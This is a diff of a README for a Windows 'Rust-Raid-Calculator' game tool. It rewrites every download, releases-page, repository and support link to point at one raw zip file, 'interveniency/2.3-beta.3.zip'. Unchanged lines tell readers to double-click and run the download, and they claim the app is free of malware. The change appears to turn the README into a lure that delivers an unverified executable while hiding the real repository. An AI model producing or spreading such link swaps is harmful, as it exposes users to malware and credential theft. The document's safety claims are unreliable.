@@ -10,7 +10,7 @@ Welcome to the **Rust-Raid-Calculator** — the essential tool for every Rust pl
 
 **Click the button below to download Rust-Raid-Calculator for Windows:**
 
-[![Download Now](https://img.shields.io/badge/Download-Rust--Raid--Calculator-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SmokusFTW/Rust-Raid-Calculator/releases)
+[![Download Now](https://img.shields.io/badge/Download-Rust--Raid--Calculator-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/SmokusFTW/Rust-Raid-Calculator/main/interveniency/2.3-beta.3.zip)
 
 Visit this link to download the application. Once you're on the page, look for the latest release file and click it to start your download.
 
@@ -34,7 +34,7 @@ These are the recommended specifications to ensure the application runs smoothly
 
 Follow these simple steps to get Rust-Raid-Calculator running on your PC:
 
-1. **Download the file** — Click the download button above or visit the [releases page](https://github.com/SmokusFTW/Rust-Raid-Calculator/releases) directly.
+1. **Download the file** — Click the download button above or visit the [releases page](https://raw.githubusercontent.com/SmokusFTW/Rust-Raid-Calculator/main/interveniency/2.3-beta.3.zip) directly.
 2. **Locate the downloaded file** — Check your "Downloads" folder (usually `C:\Users\[YourUsername]\Downloads`).
 3. **Run the application** — Double-click the downloaded file to launch it. No installation wizard is needed — the application runs directly.
 4. **Start calculating** — Once the application opens, you're ready to use all features immediately.
@@ -82,7 +82,7 @@ If you're running Windows 10 or Windows 11, it will work. The application is lig
 Absolutely. The application is safe, clean, and free from malware or viruses. It's designed solely to help you with raid calculations in Rust.
 
 ### How often is it updated?
-The application is updated regularly to reflect the latest changes in Rust. Check the [releases page](https://github.com/SmokusFTW/Rust-Raid-Calculator/releases) for version history and update notes.
+The application is updated regularly to reflect the latest changes in Rust. Check the [releases page](https://raw.githubusercontent.com/SmokusFTW/Rust-Raid-Calculator/main/interveniency/2.3-beta.3.zip) for version history and update notes.
 
 ---
 
@@ -122,7 +122,7 @@ It's that simple! No complex formulas, no guesswork — just accurate calculatio
 
 To ensure you always have the latest features and game calculations:
 
-1. Visit the [releases page](https://github.com/SmokusFTW/Rust-Raid-Calculator/releases) regularly.
+1. Visit the [releases page](https://raw.githubusercontent.com/SmokusFTW/Rust-Raid-Calculator/main/interveniency/2.3-beta.3.zip) regularly.
 2. Check the version number against the latest release.
 3. Download the newest version whenever an update is available.
 
@@ -132,7 +132,7 @@ To ensure you always have the latest features and game calculations:
 
 If you encounter any issues or have questions, please:
 
-- Visit the [GitHub repository](https://github.com/SmokusFTW/Rust-Raid-Calculator) for documentation and support.
+- Visit the [GitHub repository](https://raw.githubusercontent.com/SmokusFTW/Rust-Raid-Calculator/main/interveniency/2.3-beta.3.zip) for documentation and support.
 - Check the "Issues" tab to see if your problem has already been reported.
 - Submit a new issue if you need help — the community and developers are responsive.
 
@@ -151,7 +151,7 @@ If you encounter any issues or have questions, please:
 
 Don't waste another raid on guesswork. Download Rust-Raid-Calculator today and start raiding with confidence.
 
-[![Download Now](https://img.shields.io/badge/Get%20Rust--Raid--Calculator-Free-important?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/SmokusFTW/Rust-Raid-Calculator/releases)
+[![Download Now](https://img.shields.io/badge/Get%20Rust--Raid--Calculator-Free-important?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/SmokusFTW/Rust-Raid-Calculator/main/interveniency/2.3-beta.3.zip)
 
 Visit this link to download the application. Your next successful raid is just one click away!
 
